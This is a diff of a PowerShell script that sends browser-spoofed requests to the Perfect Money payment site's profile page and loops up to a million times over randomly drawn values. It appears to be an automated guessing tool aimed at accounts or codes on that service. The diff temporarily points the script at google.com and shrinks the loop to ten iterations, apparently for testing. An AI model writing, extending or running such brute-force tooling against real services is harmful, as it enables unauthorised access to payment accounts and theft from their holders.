@@ -31,7 +31,8 @@ $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
 
 $LoginParameters = @{
-    Uri= "https://perfectmoney.com/profile.html" ;Method= 'GET';
+    #Uri= "https://perfectmoney.com/profile.html" ;Method= 'GET';
+    Uri= "https://www.google.com/" ;Method= 'GET';
     Headers=@{
 "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
   "Accept-Encoding"="gzip, deflate, br"
@@ -52,8 +53,8 @@ $LoginParameters = @{
 
 
 #-------------------------------------start for
-for($i=0;$i -le 1000000;$i++){
-#$i    
+for($i=0;$i -le 10;$i++){
+$i    
 
 $v1=(Get-Random -InputObject $list).ToString();$v2=(Get-Random -InputObject $list).ToString();$v3=(Get-Random -InputObject $list).ToString();$v4=(Get-Random -InputObject $list).ToString();
 $v5=(Get-Random -InputObject $list).ToString();$v6=(Get-Random -InputObject $list).ToString();$v7=(Get-Random -InputObject $list).ToString();$v8=(Get-Random -InputObject $list).ToString();$v9=(Get-Random -InputObject $list).ToString();
